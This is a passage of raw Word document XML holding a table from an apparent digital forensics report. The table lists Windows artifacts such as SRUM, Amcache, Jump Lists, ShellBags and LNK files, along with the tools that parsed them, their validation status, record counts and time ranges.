              <w:t>2019-03-19 04:43:45</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:27:42</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (network usage per application)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SrumECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>128</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:22:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:43:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump Lists (automatic)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>JLECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>127</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-03-19 04:37:21.986161</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:32:08.441022</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Firefox browser (cookies)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SQLECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>124</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:26:02</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:38:51</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (vfuprov)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SrumECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>118</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:03:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:43:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: Store applications</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>117</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:09:54.920131</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:09:49.915275</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache (programs)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AmcacheParser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>113</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 00:00:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:30:38.800197</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache (devices)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AmcacheParser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>113</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:25:55.050921</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:40:30.244015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShellBags</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SBECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>100</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2022-12-09 12:44:10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:32:02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache (files)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AmcacheParser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>98</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:02:54.510687</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:31:24.097276</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Browser (history, Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>83</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:17.301104</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:38:51.773000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>73</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2012-07-26 01:26:44</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2026-10-19 15:05:18</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump Lists (custom)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>JLECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>71</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-03-19 04:46:41.241421</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:28:36.673812</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Internet Explorer / WebCache (history)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>57</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:17.301104</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:35:02.285301</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache (shortcuts)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AmcacheParser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>53</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:26:37.379069</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:26:38.269713</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>setupapi.dev.log</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>plaso</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>44</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:04:10.991000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:40:25.775000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: Uninstall</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>43</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-03-19 04:55:43.844377</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:30:37.800196</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Search (activity history)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
